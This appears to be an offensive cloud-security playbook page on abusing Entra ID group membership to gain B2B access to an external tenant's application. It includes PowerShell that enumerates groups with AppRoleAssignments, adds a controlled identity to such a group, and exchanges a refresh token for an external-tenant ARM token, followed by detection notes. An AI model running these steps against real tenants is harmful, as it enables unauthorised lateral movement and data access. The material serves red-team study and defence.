## Overview

Enterprise Applications in one Entra ID tenant can have `AppRoleAssignments` granted to groups in the same tenant. When a group holds such an assignment, its members are authorized to access the external tenant's application as B2B identities. This mechanism is by design — it controls which users can reach external apps via group membership.

The offensive angle: if the attacker can modify the membership of that group (via ownership, Group Administrator, or User Administrator scope), any identity added to the group inherits the B2B access automatically. No explicit invitation or external admin approval is needed — the group membership propagation is sufficient.

## Preconditions

| Requirement | Detail |
|---|---|
| Group with AppRoleAssignment to external tenant | The group must hold an assignment over an Enterprise App from the target external tenant |
| Group membership write access | Group ownership, `Groups Administrator`, or `User Administrator` with appropriate scope |
| Controlled identity exists in home tenant | The identity being added must exist as a user object in the home tenant |
| Cross-tenant collaboration allowed | Outbound policy in the home tenant must permit B2B collaboration toward the destination tenant |

## Identifying Groups with External AppRoleAssignments

```powershell
# Enumerate all groups and their AppRoleAssignments
$groups = Get-MgGroup -All

foreach ($group in $groups) {
    $assignments = Get-MgGroupAppRoleAssignment -GroupId $group.Id -ErrorAction SilentlyContinue
    foreach ($a in $assignments) {
        $sp = Get-MgServicePrincipal -ServicePrincipalId $a.ResourceId -ErrorAction SilentlyContinue
        [PSCustomObject]@{
            GroupName   = $group.DisplayName
            GroupId     = $group.Id
            ExternalApp = $sp.DisplayName
            ResourceId  = $a.ResourceId
            AppRoleId   = $a.AppRoleId
        }
    }
} | Format-Table GroupName, ExternalApp, AppRoleId
```

A group whose `ExternalApp` corresponds to a foreign tenant's Enterprise Application is the target. Check the group description — it often documents that members will gain access to the external environment.

## Attack Chain

```
Enumerate groups  →  identify AppRoleAssignment toward external tenant app
                  ↓
Verify scope      →  confirm group membership is modifiable (ownership or admin role)
                  ↓
Add identity      →  New-MgGroupMember → controlled identity joins the group
                  ↓
Wait propagation  →  seconds for assigned groups; may take longer for dynamic groups
                  ↓
Pivot to external tenant  →  request token for external tenant ID via refresh token
                  →  POST /oauth2/v2.0/token with tenant=<EXTERNAL_TENANT_ID>
                  ↓
Enumerate external tenant →  subscriptions, resources, RBAC, Graph objects
```

## Adding the Controlled Identity

```powershell
New-MgGroupMember -GroupId "<GROUP_ID>" -DirectoryObjectId "<CONTROLLED_USER_OBJECT_ID>"

# Confirm membership
Get-MgGroupMember -GroupId "<GROUP_ID>" -All | Where-Object { $_.Id -eq "<CONTROLLED_USER_OBJECT_ID>" }
```

## Pivoting to the External Tenant

Once membership propagates, request a token scoped to the external tenant. The Microsoft Office client ID below is a known public FOCI client ID — not lab-specific:

```powershell
# d3590ed6-52b3-4102-aeff-aad2292ab01c = Microsoft Office (public FOCI client ID)
$body = @{
    grant_type    = "refresh_token"
    client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    refresh_token = "<REFRESH_TOKEN>"
    scope         = "https://management.azure.com/.default"
}
$tokens = Invoke-RestMethod -Method POST `
    -Uri "https://login.microsoftonline.com/<EXTERNAL_TENANT_ID>/oauth2/v2.0/token" `
    -Body $body -ContentType "application/x-www-form-urlencoded"

$ExternalARMToken = $tokens.access_token
```

## Operator Notes

- The `AppRoleAssignment` only grants access to the specific Enterprise Application — it does not automatically grant RBAC on Azure resources in the external tenant. Map actual permissions via ARM and Graph after pivoting.
- For assigned groups, membership propagation is typically near-immediate. For dynamic groups based on attributes, wait for the next evaluation cycle.
- The controlled identity appears in the external tenant as a `#EXT#` guest object — its UPN follows the pattern `user_sourcetenant.onmicrosoft.com#EXT#@destinationtenant.onmicrosoft.com`.
- This technique requires write access to the group, not just read. Verify the effective permissions of the compromised token before attempting.
- Cross-tenant access policies (`ExternalIdentitiesPolicy`) in the destination tenant may restrict what the B2B identity can enumerate or access once inside.

## Detection / Friction Points

- `Add member to group` event in Entra ID Audit Log — actor, group, and added member are logged.
- In the external tenant, the B2B sign-in and any resource access appears under the guest identity's `#EXT#` UPN.
- If the group has owners notified on membership changes, they may receive an alert.
- Removing the identity from the group revokes the inherited AppRoleAssignment access — but any tokens already issued remain valid until expiry.
